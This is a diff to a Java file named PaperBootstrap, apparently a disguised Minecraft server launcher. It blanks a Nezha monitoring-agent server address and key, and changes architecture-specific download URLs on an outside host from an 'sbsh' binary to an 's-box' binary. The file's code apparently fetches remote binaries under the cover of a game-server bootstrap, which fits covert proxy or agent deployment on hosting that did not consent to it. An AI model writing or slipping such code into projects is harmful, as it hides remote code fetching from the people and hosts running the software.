@@ -94,9 +94,9 @@ public final class PaperBootstrap {
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "9cf57650-df00-4435-b45d-954c7627f197");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "nezha.ggff.net:8008");
-        envVars.put("NEZHA_KEY", "nezha123@");
-        envVars.put("NAME", "Freezehost");
+        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_KEY", "");
+        envVars.put("NAME", "");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -134,11 +134,11 @@ public final class PaperBootstrap {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            url = "https://amd64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
+            url = "https://arm64.ssss.nyc.mn/s-box";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
+            url = "https://s390x.ssss.nyc.mn/s-box";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
